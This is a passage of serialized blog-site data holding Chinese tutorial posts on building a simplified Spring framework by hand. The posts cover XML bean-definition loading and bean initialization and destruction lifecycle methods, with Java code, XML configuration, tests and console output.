XmlBeanDefinitionReaderTest {\n\n   @Test\n   public void test_xml() {\n      // 核心容器\n      DefaultListableBeanFactory beanFactory = new DefaultListableBeanFactory();\n      // 读取 xml 解析为 Bean\n      XmlBeanDefinitionReader reader = new XmlBeanDefinitionReader(beanFactory);\n      reader.loadBeanDefinitions("classpath:spring.xml");\n      // 获取指定 Bean\n      Dog dog = (Dog) beanFactory.getBean("dog");\n      dog.printName();\n   }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n',normalizedContent:'添加资源加载接口定义类：resource，及核心实现：defaultresourceloader；\n\n添加加载bean定义接口：beandefinitionreader，及核心实现xml解析：xmlbeandefinitionreader\n\n与现有容器结合：通过构造参数的方式将容器注入到xml加载器中，将加载到资源解析给指定容器\n\n\n\n * 从外部资源加载 bean\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 外部资源和现有容器整合\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n\n# 从外部资源加载 bean\n\n在 bean 的实例化和属性填充完成后，我们已经可以通过在代码里手动 new 对象的方式实现一个简单的 bean 容器。\n\n为了方便的从外部配置、加载 bean，抽取一个工具类可以从不同位置获取 定义 bean 的配置文件信息。\n\n\n# 定义一些职责和能力：\n\n 1. resource：inputstream getinputstream() throws ioexception; 定义资源接口；\n 2. resourceloader：resource getresource(string location); 定义资源包装接口，根据入参自动匹配相应的资源（resource）；\n\n\n# 具体的实现：\n\n 1. classpathresource：可以从类路径下读取资源；\n 2. filesystemresource：可以从指定路径或指定文件读取资源；\n 3. urlresource：可以从指定url读取资源；\n 4. defaultresourceloader：根据location自动匹配相应的资源；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic class defaultresourceloadertest {\n\n   private resourceloader resourceloader;\n\n   @before\n   public void init() {\n      resourceloader = new defaultresourceloader();\n   }\n\n   @test\n   public void test_classpath() throws ioexception {\n      resource resource = resourceloader.getresource("classpath:spring.xml");\n      inputstream inputstream = resource.getinputstream();\n      string content = ioutil.readutf8(inputstream);\n      system.out.println("===== classpath =====");\n      system.out.println(content);\n      system.out.println("===== classpath =====");\n   }\n\n   @test\n   public void test_file() throws ioexception {\n      resource resource = resourceloader.getresource("src/main/resources/spring.xml");\n      inputstream inputstream = resource.getinputstream();\n      string content = ioutil.readutf8(inputstream);\n      system.out.println("===== file =====");\n      system.out.println(content);\n      system.out.println("===== file =====");\n   }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 外部资源和现有容器整合\n\n从外部资源获取到 bean 的配置信息后，需要解析配置信息与现有的 bean 容器结合，增强容器的能力（省去了在代码中手动添加 bean 的过程）。\n\n\n# 定义一些职责和能力：\n\n 1. beandefinitionreader：定义加载bean定义接口，从各个资源加载为 beandefinition；\n\n\n# 具体的实现：\n\n 1. abstractbeandefinitionreader：一个抽线类默认实现，主要提供对 getregistry()、getresourceloader() 的默认实现，子类只需关心加载bean定义即可；\n 2. xmlbeandefinitionreader：从 xml 文件读取 bean，转换为 beandefinition，并注册到指定的 beandefinitionregistry （defaultlistablebeanfactory 已经具备了这个能力）；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic class xmlbeandefinitionreadertest {\n\n   @test\n   public void test_xml() {\n      // 核心容器\n      defaultlistablebeanfactory beanfactory = new defaultlistablebeanfactory();\n      // 读取 xml 解析为 bean\n      xmlbeandefinitionreader reader = new xmlbeandefinitionreader(beanfactory);\n      reader.loadbeandefinitions("classpath:spring.xml");\n      // 获取指定 bean\n      dog dog = (dog) beanfactory.getbean("dog");\n      dog.printname();\n   }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 05 - 完善Bean生命周期，加入Bean的初始化和销毁",frontmatter:{title:"手写 Spring 05 - 完善Bean生命周期，加入Bean的初始化和销毁",date:"2023-03-27T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-05.html",relativePath:"views/backend/spring-source-05.md",key:"v-0509d39a",path:"/views/backend/spring-source-05.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:639},{level:2,title:"初始化方法实现",slug:"初始化方法实现",normalizedTitle:"初始化方法实现",charIndex:645},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:658},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:674},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:686},{level:2,title:"销毁方法实现",slug:"销毁方法实现",normalizedTitle:"销毁方法实现",charIndex:702},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:658},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:674},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:686},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:760},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:767}],excerpt:"<Boxx/>\n<p>在 Spring 中，Bean 的生命周期由容器管理。当容器启动时，它会读取配置文件并创建 Bean 定义，然后通过这些定义来实例化 Bean。在 Bean 实例化的过程中，会按照一定的顺序调用一些特定的方法来完成 Bean 的初始化和销毁。</p>\n<p>Bean 初始化的方法：</p>\n<ol>\n<li>\n<p>构造方法：在实例化 Bean 时，容器会调用 Bean 的构造方法创建 Bean 的实例。</p>\n</li>\n<li>\n<p>实现 InitializingBean 接口：如果 Bean 实现了 InitializingBean 接口，容器会在 Bean 实例化之后调用它的 afterPropertiesSet() 方法。</p>\n</li>\n<li>\n<p>配置 init-method 属性：在 Bean 配置文件中，可以通过设置 init-method 属性来指定 Bean 初始化时要调用的方法。</p>\n</li>\n</ol>\n<p>Bean 销毁的方法：</p>\n<ol>\n<li>\n<p>实现 DisposableBean 接口：如果 Bean 实现了 DisposableBean 接口，容器在销毁 Bean 之前会调用它的 destroy() 方法。</p>\n</li>\n<li>\n<p>配置 destroy-method 属性：在 Bean 配置文件中，可以通过设置 destroy-method 属性来指定 Bean 销毁时要调用的方法。</p>\n</li>\n</ol>\n<p>需要注意的是，只有在容器正常关闭时，才会触发 Bean 的销毁方法。如果是容器发生异常或者是通过代码强制关闭容器，那么就不会触发 Bean 的销毁方法。</p>\n",headersStr:"解析 初始化方法实现 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 销毁方法实现 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 总结",content:'在 Spring 中，Bean 的生命周期由容器管理。当容器启动时，它会读取配置文件并创建 Bean 定义，然后通过这些定义来实例化 Bean。在 Bean 实例化的过程中，会按照一定的顺序调用一些特定的方法来完成 Bean 的初始化和销毁。\n\nBean 初始化的方法：\n\n 1. 构造方法：在实例化 Bean 时，容器会调用 Bean 的构造方法创建 Bean 的实例。\n\n 2. 实现 InitializingBean 接口：如果 Bean 实现了 InitializingBean 接口，容器会在 Bean 实例化之后调用它的 afterPropertiesSet() 方法。\n\n 3. 配置 init-method 属性：在 Bean 配置文件中，可以通过设置 init-method 属性来指定 Bean 初始化时要调用的方法。\n\nBean 销毁的方法：\n\n 1. 实现 DisposableBean 接口：如果 Bean 实现了 DisposableBean 接口，容器在销毁 Bean 之前会调用它的 destroy() 方法。\n\n 2. 配置 destroy-method 属性：在 Bean 配置文件中，可以通过设置 destroy-method 属性来指定 Bean 销毁时要调用的方法。\n\n需要注意的是，只有在容器正常关闭时，才会触发 Bean 的销毁方法。如果是容器发生异常或者是通过代码强制关闭容器，那么就不会触发 Bean 的销毁方法。\n\n\n\n * 解析\n * 初始化方法实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 销毁方法实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\n这里我们对于 xml 方式实现，主要是在配置一个 Bean 的时候指定 init-method 和 destroy-method 两个属性值即可。\n\n在通过加载器扫描 xml，解析为 Bean 定义的时候，将这 2 个值带上。然在 AbstractAutowireCapableBeanFactory.createdBean() 的时候，调用 Bean 的初始化和销毁方法即可。\n\n而销毁方法的调用需向虚拟机注册一个钩子函数，使虚拟机在执行关闭之前回调。\n\n\n# 初始化方法实现\n\n要加入 Bean 生命周期的初始化，我们知道肯定得再创建 Bean 的时候修改加入初始化的逻辑。\n\n无非就是先在 xml 中配置 init-method 方法，然后加载到 Bean 定义中（所以肯定要修改 BeanDefinition），然后在 AbstractAutowireCapableBeanFactory.createBean(String beanName, BeanDefinition beanDefinition, Object[] args) 的时候，在 Bean 进行实例化及属性填充后，读取 BeanDefinition 加载这个初始化方法。\n\n销毁方法的调用比较特殊，得在容器关闭的时候调用，我们稍后再分析。\n\n\n# 定义一些职责和能力：\n\n 1. 修改 BeanDefinition ：加入两个属性，用来保存具体是初始化和销毁的哪个方法名。\n\nprivate String initMethodName;\nprivate String destroyMethodName;\n\n\n1\n2\n\n\n\n# 具体的实现：\n\n 1. 修改 xml 加载器：XmlBeanDefinitionReader，使之解析新加的标签属性 init-method 和 destroy-method，并将解析后的值设置到 BeanDefinition 中。\n    \n    <bean id="cat" name="catBEAN" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.support.Cat">\n    \n    \n    1\n    2\n    \n    \n    修改 XmlBeanDefinitionReader 的 doLoadBeanDefinitions(InputStream inputStream)\n    \n    // 新加关键行代码\n    String initMethod = bean.getAttribute("init-method");\n    String destroyMethod = bean.getAttribute("destroy-method");\n    beanDefinition.setInitMethodName(initMethod);\n    beanDefinition.setDestroyMethodName(destroyMethod);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. AbstractAutowireCapableBeanFactory\n    \n    private void invokeInitMethods(String beanName, Object bean, BeanDefinition beanDefinition) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {\n        String initMethodName = beanDefinition.getInitMethodName();\n        if (StrUtil.isNotBlank(initMethodName)) {\n            Method initMethod = beanDefinition.getBeanClass().getMethod(initMethodName);\n            if (initMethod == null) {\n                throw new BeansException("Could not found an init method name: " + initMethodName);\n            }\n            initMethod.invoke(bean);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n    \n    主要实现了 invokeInitMethods() 这个核心方法。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 AbstractAutowireCapableBeanFactory，在 Bean 实例化及属性填充后，加入初始化方法的调用：\n    \n    /**\n     * 创建 Bean\n     */\n    @Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n            // 属性填充\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 添加 Bean 的初始化扩展\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Failed to bean instance", e);\n        }\n        addSingleton(beanName, bean);\n        return bean;\n    }\n    \n    private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // 前置处理\n        Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n        // ** 在这个一步，调用上面实现的初始化方法 **\n        try {\n            invokeInitMethods(beanName, wrappedBean, beanDefinition);\n        } catch (InvocationTargetException | IllegalAccessException | NoSuchMethodException e) {\n            throw new BeansException("Failed to bean init", e);\n        }\n        // 后置处理\n        wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n        return wrappedBean;\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    \n    \n    这样就把初始化加入到了 Bean 的创建中。\n\n\n# 销毁方法实现\n\n销毁方法的调用比较特殊，在 Spring 容器关闭时，会触发销毁所有 bean 的过程。\n\n销毁方法的配置方式：\n\n 1. 跟初始化方法一样，可以在 xml 中配置 destroy-method 方法。\n 2. 为了更好的扩展，我们可以定义接口，只要一个 Bean 实现了相应的初始化或销毁接口，就可以在容器中自动调用相应的实现方法。\n 3. 注解方式，我们现在赞不讨论。\n\n\n# 定义一些职责和能力：\n\n 1. InitializingBean ：如果 bean 实现了 InitializingBean 接口，容器会调用它的 afterPropertiesSet() 方法，完成 bean 的初始化。如果 bean 没有实现 InitializingBean 接口，容器会调用配置文件中指定的初始化方法（如果有）。\n\n 2. DisposableBean：如果 bean 实现了 DisposableBean 接口，容器会调用它的 destroy() 方法，完成 bean 的销毁。如果 bean 没有实现 DisposableBean 接口，容器会调用配置文件中指定的销毁方法（如果有）。\n\n 3. SingletonBeanRegistry：之前已经提供过获取一个单例 Bean 的能力。这里再加上\n    \n    注册待销毁的单例对象的能力：void registerDisposableBean(String beanName, DisposableBean bean);\n    \n    销毁所有单例 Bean 的能力：void destroySingletons();。\n\n 4. ConfigurableApplicationContext\n    \n    extendsApplicationContext\n    \n    ConfigurableApplicationContext是Spring框架中ApplicationContext接口的一个扩展接口，它提供了一些额外的方法，例如refresh()：刷新容器，registerShutdownHook()：注册关闭钩子函数，和close()：关闭函数，用于配置和管理应用程序上下文的生命周期和属性。\n\n\n# 具体的实现：\n\n 1. DisposableBeanAdapter：实现了 DisposableBean 接口，并将其委托给一个实际的bean实例来执行销毁操作。这个适配类的出现主要是为了解决在虚拟机关闭的时候不想关注到底是哪种（xml或接口或注解）方式的销毁，由此出现这个适配类。\n    \n    public class DispoableBeanAdapter implements DisposableBean {\n    \n        private final Object bean;\n        private final String beanName;\n        private final String destroyMethodName;\n    \n        public DispoableBeanAdapter(Object bean, String beanName, BeanDefinition beanDefinition) {\n            this.bean = bean;\n            this.beanName = beanName;\n            this.destroyMethodName = beanDefinition.getDestroyMethodName();\n        }\n    \n        @Override\n        public void destroy() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n            // 1. 实现接口的方式调用\n            if (bean instanceof DisposableBean) {\n                ((DisposableBean) bean).destroy();\n            }\n            // 2. xml 方式反射调用初始化方法\n            if (StrUtil.isNotBlank(destroyMethodName) && !(bean instanceof DisposableBean)) {\n                Method destroyMethod = bean.getClass().getMethod(destroyMethodName);\n                if (destroyMethod == null) {\n                    throw new BeansException("Could not found an init method name: " + destroyMethodName);\n                }\n                destroyMethod.invoke(bean);\n            }\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 2. DefaultSingletonBeanRegistry\n    \n    implements SingletonBeanRegistry\n    \n    主要实现 registerDisposableBean(String beanName, DisposableBean bean); 和 void destroySingletons();\n    \n    public class DefaultSingletonBeanRegistry implements SingletonBeanRegistry {\n    \n        private final Map<String, Object> singletonObjects = new HashMap<>();\n    \n        private final Map<String, DisposableBean> disposableBeans = new HashMap<>();\n    \n        @Override\n        public Object getSingleton(String beanName) {\n            return singletonObjects.get(beanName);\n        }\n    \n        protected void addSingleton(String beanName, Object singletonObject) {\n            singletonObjects.put(beanName, singletonObject);\n        }\n    \n        @Override\n        public void registerDisposableBean(String beanName, DisposableBean bean) {\n            disposableBeans.put(beanName, bean);\n        }\n    \n        @Override\n        public void destroySingletons() {\n            Set<String> keySet = disposableBeans.keySet();\n            Object[] disposableBeanNames = keySet.toArray();\n            for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n                Object beanName = disposableBeanNames[i];\n                DisposableBean disposableBean = disposableBeans.remove(beanName);\n                try {\n                    disposableBean.destroy();\n                } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException e) {\n                    throw new BeansException("Failed to bean:[" + beanName + "] destroy", e);\n                }\n            }\n    \n        }\n        \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    \n\n 3. 在 AbstractAutowireCapableBeanFactory\n    \n    extends AbstractBeanFactory （它又 extends DefaultSingletonBeanRegistry，已经具备了注册待销毁的Bean的能力）\n    \n    implements AutowireCapableBeanFactory\n    \n    Bean实例化、属性填充、初始化（Bean的前后置处理）之后，注册所有实现了 DisposableBean 接口的 Bean 对象，留待容器停止的时候调用。\n    \n        protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n            Object bean = null;\n            try {\n                // 实例化\n                bean = createBeanInstance(beanName, beanDefinition, args);\n                // 属性填充\n                applyPropertyValues(beanName, bean, beanDefinition);\n                // 添加 Bean 的初始化扩展\n                bean = initializeBean(beanName, bean, beanDefinition);\n            } catch (Exception e) {\n                throw new BeansException("Failed to bean instance", e);\n            }\n            // 注册所有实现了 DisposableBean 接口的 Bean 对象，留待容器停止的时候调用。\n            registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            // 添加单例 Bean 缓存\n            addSingleton(beanName, bean);\n            return bean;\n        }\n    \n        protected void registerDisposableBeanIfNecessary(String beanName, Object bean, BeanDefinition beanDefinition) {\n            if (bean instanceof DisposableBean || StrUtil.isNotBlank(beanDefinition.getDestroyMethodName())) {\n                registerDisposableBean(beanName, new DispoableBeanAdapter(bean, beanName, beanDefinition));\n            }\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    主要实现了 registerDisposableBeanIfNecessary() 这个方法。\n\n 4. AbstractApplicationContext\n    \n    extends DefaultResourceLoader\n    \n    implements ConfigurableApplicationContext （需要实现注册虚拟机关闭钩子函数和关闭容器的方法）\n    \n        /** refresh()在之前已经实现 */\n    \t@Override\n        public void refresh() {\n            // 1. 创建 Bean 工厂，加载 BeanDefinition\n            refreshBeanFactory();\n    \n            // 2. 获得 Bean 工厂\n            ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n    \n            // 3. BeanDefinition 扩展点：\n            // Spring 容器中 BeanDefinition 的扩展点。\n            // 创建 BeanDefinition 之后，但在创建 Bean 实例之前。\n            invokeBeanFactoryPostProcessors(beanFactory);\n    \n            // 4. Bean 扩展点：\n            // 提前注册所有的 BeanPostProcessor，在 Bean 创建后，初始化时扩展\n            // （见 AbstractAutowireCapableBeanFactory.createBean ）。\n            registerBeanPostProcessors(beanFactory);\n    \n            // 5. 提前实例化所有的单例 Bean\n            beanFactory.preInstantiateSingletons();\n        }\n    \n        @Override\n        public void registerShutdownHook() {\n            Runtime.getRuntime().addShutdownHook(new Thread(this::close));\n        }\n    \n        @Override\n        public void close() {\n            getBeanFactory().destroySingletons();\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n\n# 将实现加入原有的逻辑中：\n\n 1. 总结就是先定义了两个接口 InitializingBean 和 DisposableBean，实现他们就具备了相应的能力。\n 2. 在 创建 Bean 的时候调用所有初始化方法。\n 3. 因为虚拟机关闭时不想关系具体销毁的实现，所有加了个 DisposableBean 包装所有的销毁方式。\n 4. Bean 工厂得具备销毁的能力，所以得有注册和销毁的方法。在 SingletonBeanRegistry 定义：注册所有的待销毁实例+销毁所有可销毁的Bean（就是看有没有实现DisposableBean接口或xml指定销毁方法，有就提前存起来），而 DefaultSingletonBeanRegistry 就是对这两个能力的实现。\n 5. 容器得具备销毁的能力（实际就是调用 Bean 工厂的销毁），在 ConfigurableApplicationContext 定义了 refresh()：刷新容器，registerShutdownHook()：注册关闭钩子函数，和close()：关闭函数。而 AbstractApplicationContext 就是对它的实现（调用 Bean 工厂的销毁方法）。\n\n\n# 测试：\n\n * xml 准备，这里 cat 采用 xml 的方式实现 init 和 destroy。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catBEAN" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.support.Cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.Dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.CatBeanPostProcessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.DogBeanFactoryPostProcessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * Dog 准备，实现接口的方式\n\npublic class Dog implements InitializingBean, DisposableBean {\n\n    private String name;\n\n    private Cat cat;\n\n    private static Map<String, Object> initMap = new HashMap<>();\n\n    static {\n        initMap.put("inner-dog1", "TomDog");\n        initMap.put("inner-dog2", "JerryDog");\n    }\n\n    @Override\n    public void afterPropertiedSet() {\n        System.out.println("-- Dog afterPropertiedSet method by xml --");\n    }\n\n    @Override\n    public void destroy() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        System.out.println("-- Dog destroy method by xml --");\n    }\n\n    public void printName() {\n        System.out.println(this.name);\n        System.out.println(this.cat);\n        System.out.println(initMap);\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Cat getCat() {\n        return cat;\n    }\n\n    public void setCat(Cat cat) {\n        this.cat = cat;\n    }\n\n    @Override\n    public String toString() {\n        return "Dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", cat=" + cat +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n * 测试类\n\n    @Test\n    public void test_xml_context_close() {\n        // 1. 利用 xml上下文 加载Bean\n        // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n        // * 可以提前注册 JVM 关闭钩子，用来确保 Spring 容器在 JVM 关闭之前正确地关闭并释放所有资源。\n        applicationContext.registerShutdownHook();\n        // 2. 获取bean\n        Dog dog = (Dog) applicationContext.getBean("dog");\n\n        String[] beanDefinitionNames = applicationContext.getBeanDefinitionNames();\n        System.out.println();\n        System.out.println(JSONUtil.toJsonStr(beanDefinitionNames));\n        System.out.println();\n        dog.printName();\n        // * close 和 registerShutdownHook 比，比较暴力，直接手动调用关闭\n        // applicationContext.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 测试结果\n\n进入到 BeanDefinition 扩展点 BeanFactoryPostProcessor -> postProcessBeanFactory\nbeanName：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-BeanDefinition-updated\n\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\n-- Cat init method by xml --\nbeanName：cat 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessBeforeInitialization\n-- Dog afterPropertiedSet method by interface --\nbeanName：dog 进入到 Bean 扩展点 BeanPostProcessor -> postProcessAfterInitialization\n\n["cat","catBeanPostProcessor","dog","dogBeanFactoryPostProcessor"]\n\ndog-BeanDefinition-updated\nCat{name=\'postProcessBeforeInitialization name cat\'}\n{inner-dog2=JerryDog, inner-dog1=TomDog}\n-- Dog destroy method by interface --\n-- Cat destroy method by xml --\n\nProcess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 总结\n\nSpring Bean 的初始化和销毁是指在 Spring 容器管理下的 Bean 对象在被实例化和使用前、以及在容器关闭时，分别会执行一些特定的方法，以完成一些必要的操作。下面是关于 Spring Bean 初始化和销毁的总结：\n\n 1. 初始化方法：\n\n在 Spring 容器创建 Bean 时，可以通过指定一些特定的初始化方法来对 Bean 进行初始化。Spring 提供了以下三种方式：\n\n * 通过实现 InitializingBean 接口来自定义初始化方法；\n * 通过在Bean配置文件中定义 init-method 属性来指定初始化方法；\n * 通过 @PostConstruct 注解来定义初始化方法。\n\n 1. 销毁方法：\n\n在 Spring 容器关闭时，需要对一些资源进行清理或释放，这时可以通过指定一些特定的销毁方法来完成。Spring 提供了以下两种方式：\n\n * 通过实现 DisposableBean 接口来自定义销毁方法；\n * 通过在Bean配置文件中定义 destroy-method 属性来指定销毁方法。\n\n需要注意的是，只有当 Bean 被 Spring 容器管理时，才能够执行初始化和销毁方法。如果 Bean 不是由 Spring 容器管理，则不会执行初始化和销毁方法。\n\n此外，Spring 还提供了一种通过 Java 注解来管理 Bean 的生命周期的方式，即通过 @PreDestroy 注解来定义Bean的作用域和销毁方法。\n\n总之，Spring Bean 的初始化和销毁方法可以通过实现特定接口、指定特定属性或使用注解来实现。在实际应用中，需要根据具体的业务需求和场景来选择合适的方式来管理Bean的生命周期。',normalizedContent:'在 spring 中，bean 的生命周期由容器管理。当容器启动时，它会读取配置文件并创建 bean 定义，然后通过这些定义来实例化 bean。在 bean 实例化的过程中，会按照一定的顺序调用一些特定的方法来完成 bean 的初始化和销毁。\n\nbean 初始化的方法：\n\n 1. 构造方法：在实例化 bean 时，容器会调用 bean 的构造方法创建 bean 的实例。\n\n 2. 实现 initializingbean 接口：如果 bean 实现了 initializingbean 接口，容器会在 bean 实例化之后调用它的 afterpropertiesset() 方法。\n\n 3. 配置 init-method 属性：在 bean 配置文件中，可以通过设置 init-method 属性来指定 bean 初始化时要调用的方法。\n\nbean 销毁的方法：\n\n 1. 实现 disposablebean 接口：如果 bean 实现了 disposablebean 接口，容器在销毁 bean 之前会调用它的 destroy() 方法。\n\n 2. 配置 destroy-method 属性：在 bean 配置文件中，可以通过设置 destroy-method 属性来指定 bean 销毁时要调用的方法。\n\n需要注意的是，只有在容器正常关闭时，才会触发 bean 的销毁方法。如果是容器发生异常或者是通过代码强制关闭容器，那么就不会触发 bean 的销毁方法。\n\n\n\n * 解析\n * 初始化方法实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 销毁方法实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\n这里我们对于 xml 方式实现，主要是在配置一个 bean 的时候指定 init-method 和 destroy-method 两个属性值即可。\n\n在通过加载器扫描 xml，解析为 bean 定义的时候，将这 2 个值带上。然在 abstractautowirecapablebeanfactory.createdbean() 的时候，调用 bean 的初始化和销毁方法即可。\n\n而销毁方法的调用需向虚拟机注册一个钩子函数，使虚拟机在执行关闭之前回调。\n\n\n# 初始化方法实现\n\n要加入 bean 生命周期的初始化，我们知道肯定得再创建 bean 的时候修改加入初始化的逻辑。\n\n无非就是先在 xml 中配置 init-method 方法，然后加载到 bean 定义中（所以肯定要修改 beandefinition），然后在 abstractautowirecapablebeanfactory.createbean(string beanname, beandefinition beandefinition, object[] args) 的时候，在 bean 进行实例化及属性填充后，读取 beandefinition 加载这个初始化方法。\n\n销毁方法的调用比较特殊，得在容器关闭的时候调用，我们稍后再分析。\n\n\n# 定义一些职责和能力：\n\n 1. 修改 beandefinition ：加入两个属性，用来保存具体是初始化和销毁的哪个方法名。\n\nprivate string initmethodname;\nprivate string destroymethodname;\n\n\n1\n2\n\n\n\n# 具体的实现：\n\n 1. 修改 xml 加载器：xmlbeandefinitionreader，使之解析新加的标签属性 init-method 和 destroy-method，并将解析后的值设置到 beandefinition 中。\n    \n    <bean id="cat" name="catbean" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.support.cat">\n    \n    \n    1\n    2\n    \n    \n    修改 xmlbeandefinitionreader 的 doloadbeandefinitions(inputstream inputstream)\n    \n    // 新加关键行代码\n    string initmethod = bean.getattribute("init-method");\n    string destroymethod = bean.getattribute("destroy-method");\n    beandefinition.setinitmethodname(initmethod);\n    beandefinition.setdestroymethodname(destroymethod);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. abstractautowirecapablebeanfactory\n    \n    private void invokeinitmethods(string beanname, object bean, beandefinition beandefinition) throws invocationtargetexception, illegalaccessexception, nosuchmethodexception {\n        string initmethodname = 